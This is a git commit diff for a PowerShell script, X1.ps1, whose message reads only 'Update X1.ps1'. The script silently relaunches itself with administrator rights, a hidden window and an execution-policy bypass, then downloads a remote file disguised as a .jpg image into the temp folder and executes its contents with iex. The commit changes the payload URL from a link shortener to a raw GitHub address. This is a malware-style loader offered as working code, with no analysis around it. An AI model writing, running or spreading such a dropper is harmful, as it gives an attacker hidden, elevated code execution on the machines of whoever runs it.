c5c2db637f68974cb5322242ec7da124458d2481
node-nl0 <irena.dler.fox@gmail.com>
2026-07-15 23:25:06 +0300

    Update X1.ps1

--- X1.ps1
+++ X1.ps1
@@ -1,7 +1,7 @@
 if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
     Start-Process -Verb RunAs powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden;exit
 }
-$url="https://surli.cc/sffydz"
+$url="https://raw.githubusercontent.com/node-nl0/-/main/385.jpg"
 $path="$env:TEMP\385.jpg"
 (New-Object Net.WebClient).DownloadFile($url,$path)
 iex(Get-Content $path -Raw)
